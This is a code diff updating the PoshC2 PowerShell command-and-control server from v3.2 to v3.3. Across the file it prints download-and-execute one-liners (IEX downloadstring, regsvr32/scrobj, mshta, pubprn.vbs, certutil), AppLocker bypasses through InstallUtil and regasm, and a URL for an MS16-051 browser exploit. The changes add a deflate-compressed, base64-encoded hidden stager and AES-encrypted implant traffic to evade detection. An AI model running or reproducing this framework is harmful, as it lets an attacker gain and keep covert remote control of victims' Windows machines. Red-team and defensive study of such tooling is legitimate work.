@@ -17,7 +17,7 @@ Write-Host -Object " |     ___/  _ \/  ___/  |  \  /    \  \/  /  ____/ "  -Fore
 Write-Host -Object " |    |  (  <_> )___ \|   Y  \ \     \____/       \ "  -ForegroundColor Green
 Write-Host -Object " |____|   \____/____  >___|  /  \______  /\_______ \"  -ForegroundColor Green
 Write-Host -Object "                    \/     \/          \/         \/"  -ForegroundColor Green
-Write-Host "=============== v3.2 www.PoshC2.co.uk =============" -ForegroundColor Green
+Write-Host "=============== v3.3 www.PoshC2.co.uk =============" -ForegroundColor Green
 Write-Host "" -ForegroundColor Green
 
 if (!$RestartC2Server) {
@@ -262,20 +262,18 @@ function PatchDll {
         $dllOffset = 0x00017100
     }
 
-    # Patch DLL - replace 5000 A's
-    $AAAA = "A"*5000
-    $AAAABytes = ([System.Text.Encoding]::UNICODE).GetBytes($AAAA)
+    # Patch DLL - replace 8000 A's
     $replaceStringBytes = ([System.Text.Encoding]::UNICODE).GetBytes($replaceString)
     
     # Length of replacement code
     $dllLength = $replaceString.Length
-    $patchLength = 5000 -$dllLength
+    $patchLength = 8000 -$dllLength
     $nullString = 0x00*$patchLength
     $nullBytes = ([System.Text.Encoding]::UNICODE).GetBytes($nullString)
     $nullBytes = $nullBytes[1..$patchLength]
     $replaceNewStringBytes = ($replaceStringBytes+$nullBytes)
 
-    $dllLength = 10000 -3
+    $dllLength = 16000 -2
     $i=0
     # Loop through each byte from start position
     $dllOffset..($dllOffset + $dllLength) | % {
@@ -299,6 +297,7 @@ if ($RestartC2Server)
     $c2serverresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM C2Server" -As PSObject
     $defaultbeacon = $c2serverresults.DefaultSleep
     $killdatefm = $c2serverresults.KillDate
+    $EncKey = $c2serverresults.EncKey
     $ipv4address = $c2serverresults.HostnameIP 
     $DomainFrontHeader = $c2serverresults.DomainFrontHeader 
     $serverport = $c2serverresults.ServerPort 
@@ -313,6 +312,10 @@ if ($RestartC2Server)
     $Insecure = $c2serverresults.Insecure
     $useragent = $c2serverresults.UserAgent
 
+    $downloadStub = $urlstring -split ","
+    $downloadStubURL = $downloadStub[1] -replace '"',''
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
 
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
@@ -320,24 +323,24 @@ if ($RestartC2Server)
 
     write-host $shortcut `n -ForegroundColor green
     write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close)" -ForegroundColor green
     write-host ""
     write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`")(window.close)" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close)" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`"" -ForegroundColor green
     write-host ""
     write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_df`"" -ForegroundColor green
-    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`"" -ForegroundColor green
+    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
     write-host ""
 
     #launch a new powershell session with the implant handler running
@@ -346,7 +349,12 @@ if ($RestartC2Server)
     foreach ($task in $taskscompleted) {
     $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$task" -as PSObject
     $ranuri = $resultsdb.RandomURI
-    $implanthost = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
+    $implantResults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
+    $implanthost = $implantResults.User
+    $impHost = $implantResults.Hostname
+    $impID = $implantResults.ImplantID
+    $impDom = $implantResults.Domain
+
     if ($resultsdb)
     {
         if ($resultsdb.Command.tolower().startswith('get-screenshot')) {}
@@ -354,9 +362,10 @@ if ($RestartC2Server)
         elseif  ($resultsdb.Command.tolower().startswith('download-file')) {}
         else 
         {
-            Write-Host "Command Issued @" $resultsdb.TaskID "Against Host" $implanthost -ForegroundColor Green
-            Write-Host -Object $resultsdb.Command -ForegroundColor Red
-            Write-Host -Object $resultsdb.Output
+            $Tasktime = $resultsdb.TaskID
+            Write-Host "Command issued against implant $impID on host $impHost $impDom ($TaskTime)" -ForegroundColor Yellow
+            Write-Host -Object $resultsdb.Command -ForegroundColor Green
+            Write-Host -Object $resultsdb.Output -ForegroundColor Green
         }
         $taskiddb ++
     }
@@ -641,12 +650,16 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     $enablepayloads = "Yes"
     $prompt = Read-Host -Prompt "[11] Do you want all payloads or select limited payloads that shouldnt be caught by AV? [$($enablepayloads)]"
     $enablepayloads = ($enablepayloads,$prompt)[[bool]$prompt]
-    
+    $downloadStub = $urlstring -split ","
+    $downloadStubURL = $downloadStub[1] -replace '"',''
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
+
     $downloaduri = Get-RandomURI -Length 5
     if ($ipv4address.Contains("https")) {
-        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+"" 
+        $shortcut = "powershell -exec bypass -c "+'"'+"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)')"+'"'+"" 
     } else {
-        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/webapp/static/$($downloaduri)')"+'"'+""     
+        $shortcut = "powershell -exec bypass -c "+'"'+"IEX (new-object system.net.webclient).downloadstring('$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)')"+'"'+""     
     }
 
     $httpresponse = '
@@ -660,6 +673,9 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
 <address>Apache (Debian) Server</address>
 </body></html>
     '
+
+    $EncKey = Create-AesKey
+
     New-Item $global:newdir -Type directory | Out-Null
     New-Item $global:newdir\downloads -Type directory | Out-Null
     New-Item $global:newdir\reports -Type directory | Out-Null
@@ -720,6 +736,7 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     $Query = 'CREATE TABLE C2Server (
         ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL UNIQUE,
         HostnameIP TEXT,
+        EncKey TEXT,
         DomainFrontHeader TEXT,
         DefaultSleep TEXT,
         KillDate TEXT,
@@ -747,13 +764,14 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
 
     Invoke-SqliteQuery -Query $Query -DataSource $Database | Out-Null
 
-    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent)
-            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent)'
+    $Query = 'INSERT INTO C2Server (DefaultSleep, KillDate, HostnameIP, EncKey, DomainFrontHeader, HTTPResponse, FolderPath, ServerPort, QuickCommand, DownloadURI, Sounds, APIKEY, MobileNumber, URLS, SocksURLS, Insecure, UserAgent)
+            VALUES (@DefaultSleep, @KillDate, @HostnameIP, @EncKey, @DomainFrontHeader, @HTTPResponse, @FolderPath, @ServerPort, @QuickCommand, @DownloadURI, @Sounds, @APIKEY, @MobileNumber, @URLS, @SocksURLS, @Insecure, @UserAgent)'
 
     Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
         DefaultSleep = $defaultbeacon
         KillDate = $killdatefm
         HostnameIP  = $ipv4address
+        EncKey  = $EncKey
         DomainFrontHeader  = $domainfrontheader
         HTTPResponse = $httpresponse
         FolderPath = $global:newdir
@@ -770,6 +788,7 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     } | Out-Null
 
     $Host.ui.RawUI.WindowTitle = "PoshC2 Server: $ipv4address Port $serverport"
+    Write-Host `n"PoshC2 Unique Encryption Key: $EncKey"
 
     Write-Host `n"Apache rewrite rules written to: $global:newdir\apache.conf" -ForegroundColor Green
     Out-File -InputObject $apache -Encoding ascii -FilePath "$global:newdir\apache.conf"
@@ -779,24 +798,24 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
 
     write-host $shortcut `n -ForegroundColor green
     write-Host "For a more stealthy approach, use SubTee's hidden gems, NOTE: These do not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`"" -ForegroundColor green
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_cs`")(window.close)" -ForegroundColor green
+    write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_cs`")(window.close)" -ForegroundColor green
     write-host ""
     write-Host "Or use Forshaw's DotNetToJS to obtain execution, NOTE: This does not work with untrusted SSL certificates if using over HTTPS:"
-    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`")(window.close)" -ForegroundColor green
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_js`"" -ForegroundColor green
+    write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`")(window.close)" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_js`"" -ForegroundColor green
     write-host ""
     write-Host "To Bypass AppLocker or equivalent, use InstallUtil.exe or Regasm:"
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U $global:newdir\payloads\posh.exe" -ForegroundColor green
     write-host ""
     write-Host "To exploit MS16-051 via IE9-11 use the following URL:"
-    write-host "$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_ms16-051" -ForegroundColor green
+    write-host "$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_ms16-051" -ForegroundColor green
     write-host ""
     write-Host "To download PoshC2 InstallUtil/General executable use the following URL:"
-    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/webapp/static/$($downloaduri)_df`"" -ForegroundColor green
-    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/webapp/static/$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_df`"" -ForegroundColor green
+    write-host "certutil -urlcache -split -f $($ipv4address):$($serverport)/$($downloadStubURL)$($downloaduri)_iu %temp%\\$($downloaduri)_iu" -ForegroundColor green
     write-host ""
 
     # call back command
@@ -807,9 +826,9 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
     
     Import-Module $PoshPath\C2-Payloads.ps1 
     if ($Insecure -eq "YES") {
-        $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent -Insecure
     } else {
-        $command = createdropper -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
+        $command = createdropper -enckey $enckey -killdate $killdatefm -domainfrontheader $DomainFrontHeader -ipv4address $ipv4address -serverport $serverport -useragent $useragent
     }
     $payload = createrawpayload -command $command
 
@@ -837,7 +856,6 @@ RewriteRule ^/saml/stats/update/push(.*) $uri`${SharpSocks}/saml/stats/update/pu
         cs_sct
         df_sct
     }
-
     
     #launch a new powershell session with the implant handler running
     Start-Process -FilePath powershell.exe -ArgumentList " -NoP -Command import-module $PoshPath\Implant-Handler.ps1; Implant-Handler -FolderPath '$global:newdir' -PoshPath '$PoshPath'"
@@ -910,12 +928,18 @@ while ($listener.IsListening)
     $message = $null
     $context = $listener.GetContext() # blocks until request is received
     $request = $context.Request
-    $response = $context.Response       
-    if ($request.Url -match "/webapp/static/$($downloaduri)$") 
+    $response = $context.Response
+    
+    $downloadStub = $urlstring -split ","
+    $downloadStubURL = $downloadStub[1] -replace '"',''
+    $newImplant = $urlstring -split ","
+    $newImplantURL = $newImplant[0] -replace '"',''
+       
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)$") 
     {
         $message = $payload
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_ms16-051$")
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_ms16-051$")
     {
         if ([System.IO.File]::Exists("$global:newdir/payloads/ms16-051.html")){
             $message = Get-Content -Path $global:newdir/payloads/ms16-051.html
@@ -924,7 +948,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_rg$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_rg$") 
     {
         
         if ([System.IO.File]::Exists("$global:newdir/payloads/rg_sct.xml")){
@@ -934,7 +958,7 @@ while ($listener.IsListening)
         }
        
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_cs$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_cs$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/cs_sct.xml")){
@@ -944,7 +968,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_js$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_js$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/js_sct.xml")){
@@ -954,7 +978,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_df$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_df$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/df_sct.xml")){
@@ -964,7 +988,7 @@ while ($listener.IsListening)
         }
 
     }
-    if ($request.Url -match "/webapp/static/$($downloaduri)_iu$") 
+    if ($request.Url -match "$($downloadStubURL)$($downloaduri)_iu$") 
     {
 
         if ([System.IO.File]::Exists("$global:newdir/payloads/posh.exe")){
@@ -975,11 +999,12 @@ while ($listener.IsListening)
         }
 
     }
-    if ((($request.Url -match '/connect$') -or ($request.Url -match '/connect\?p') -or ($request.Url -match '/connect\?d')) -and (($request.Cookies[0]).Name -match 'SessionID')) 
+    if ((($request.Url -match "/$($newImplantURL)$") -or ($request.Url -match "/$($newImplantURL)\?p") -or ($request.Url -match "/$($newImplantURL)\?d")) -and (($request.Cookies[0]).Name -match 'SessionID')) 
     { 
-        if ($request.Url -match '/connect\?p') {$type = "Proxy"} 
-        if ($request.Url -match '/connect\?d') {$type = "Daisy"} 
-        if ($request.Url -match '/connect$') {$type = "Normal"}
+
+        if ($request.Url -match "/$($newImplantURL)\?p") {$type = "Proxy"} 
+        if ($request.Url -match "/$($newImplantURL)\?d") {$type = "Daisy"} 
+        if ($request.Url -match "/$($newImplantURL)$") {$type = "Normal"}
 
         # generate randon uri
         $randomuri = Get-RandomURI -Length 15
@@ -988,8 +1013,7 @@ while ($listener.IsListening)
         # create new key for each implant comms
         $key = Create-AesKey
         $endpointip = $request.RemoteEndPoint
-
-        $cookieplaintext = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(($request.Cookies[0]).Value))
+        $cookieplaintext = Decrypt-String -key $EncKey -encryptedStringWithIV ($request.Cookies[0]).Value
 
         $im_domain,$im_username,$im_computername,$im_arch,$im_pid,$im_proxy = $cookieplaintext.split(";",6)
 
@@ -1003,14 +1027,14 @@ while ($listener.IsListening)
         #
         ## add anti-ir and implant safety mechanisms here!
         $im_firstseen = $(Get-Date)
-        if ($request.Url -match '/connect\?p') {
+        if ($request.Url -match "/$($newImplantURL)\?p") {
             Write-Host "New Proxy implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
 $connectvars = '
 $URI= "'+$randomuri+'"
 $Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
 $ServerClean = "'+$ipv4address+":"+$serverport+'"
 '
-        } elseif ($request.Url -match '/connect\?d') {
+        } elseif ($request.Url -match "/$($newImplantURL)\?d") {
             Write-Host "New Daisy implant connected: (uri=$randomuri, key=$key)" -ForegroundColor Green
 $connectvars = '
 $URI= "'+$randomuri+'"
@@ -1093,14 +1117,29 @@ $sleeptime = '+$defaultbeacon+'
 $payloadclear = @"
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
 `$S="$s"
-function Get-Webclient {${function:Get-Webclient}} function Primer {${function:primer}}
+function DEC {${function:DEC}}
+function ENC {${function:ENC}}
+function CAM {${function:CAM}}
+function Get-Webclient {${function:Get-Webclient}} 
+function Primer {${function:primer}}
 `$primer = primer
 if (`$primer) {`$primer| iex} else {
 start-sleep 10
 primer | iex }
 "@
-$bytes = [System.Text.Encoding]::Unicode.GetBytes($payloadclear)
-$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e "+[Convert]::ToBase64String($bytes)
+
+$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
+$CompressedStream = New-Object IO.MemoryStream
+$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
+$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
+$DeflateStream.Dispose()
+$CompressedScriptBytes = $CompressedStream.ToArray()
+$CompressedStream.Dispose()
+$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
+$NewScript = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`"$EncodedCompressedScript`"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
+$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))
+$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e $($EncodedPayloadScript)"
 $payload = $payloadraw -replace "`n", ""
 
 function GetImgData($cmdoutput) {
@@ -1353,9 +1392,7 @@ while($true)
     break
     }
 }'
-
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
-$message =[Convert]::ToBase64String($Bytes)
+$message = Encrypt-String -key $EncKey -unencryptedString $message
 
     }
 
@@ -1368,6 +1405,9 @@ $message =[Convert]::ToBase64String($Bytes)
         $im_results = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
         $key = $im_results.Key
         $hostname = $im_results.Hostname
+        $implantID = $im_results.ImplantID
+        $imDom = $im_results.Domain
+
         $currenttime = (Get-Date)
         $multicmdresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri'" -As PSObject
         # send multi commands to the client 
@@ -1378,7 +1418,7 @@ $message =[Convert]::ToBase64String($Bytes)
                 $taskid = $i.Command
                 $taskidtime = $i.TaskID
                 if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
-                    Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
+                    Write-Host "Command issued against implant $implantID on host $hostname $imDom" -ForegroundColor Yellow
                     if  ($taskid.ToLower().startswith('upload-file')) {
                         Write-Host -Object "Uploading File" -ForegroundColor Yellow
                     } elseif ($taskid.ToLower().startswith("`$shellcode")) {
@@ -1582,7 +1622,10 @@ $message =[Convert]::ToBase64String($Bytes)
         $implanthost = $im_result.User
         $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue
         $taskcompledtime = $resultsdb.TaskID
-        Write-Host "Command returned against host:" $im_result.Hostname $im_result.Domain "($taskcompledtime)" -ForegroundColor Green
+        $imID = $im_result.ImplantID
+        $imHost = $im_result.Hostname
+        $imDom = $im_result.Domain
+        Write-Host "Command returned against implant $imID on host $imHost $imDom ($taskcompledtime)" -ForegroundColor Green
         Write-Host -Object $resultsdb.Output -ForegroundColor Green
         $taskiddb ++
     }
